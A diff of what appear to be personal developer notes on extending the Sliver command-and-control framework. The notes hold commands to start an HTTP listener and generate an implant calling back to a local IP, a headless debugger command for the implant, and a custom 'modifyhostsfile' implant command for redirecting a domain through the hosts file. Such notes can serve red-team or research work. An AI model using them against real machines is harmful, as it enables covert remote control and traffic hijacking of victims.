@@ -10,9 +10,11 @@ cd ~/Documents/Tools/SliverX/
 
 Payload
 http -l 8080
-generate --http http://192.168.68.130:8080 -d --skip-symbols
+generate --http http://172.20.10.14:8080 -d --skip-symbols
 
-dlv.exe exec --api-version 2 --headless --listen 192.168.68.128:5555 --log .\KIND_BARBITURATE.exe
+
+
+dlv exec --api-version 2 --headless --listen 172.20.10.13:5555 --log .\SAFE_CANVAS.exe
 
 
 ----------------------
@@ -156,3 +158,25 @@ New file modifyhostsfile.go:
 
             con.PrintInfof("Here the output coming from the implant: %s\n", hw.Output)
         }
+
+
+------------------
+
+standard:
+
+helloworld - modifyhostsfile
+helloWorld - modifyHostsFile
+HelloWorld - ModifyHostsFile
+
+call:
+
+modifyhostsfile new -d jose.com -i 1.2.3.4 -t 40000
+
+Implant handler
+
+Files touched:
+
+implant/sliver/handlers/handlers_windows.go 
+protobuf/sliverpb/constants.go
+
+
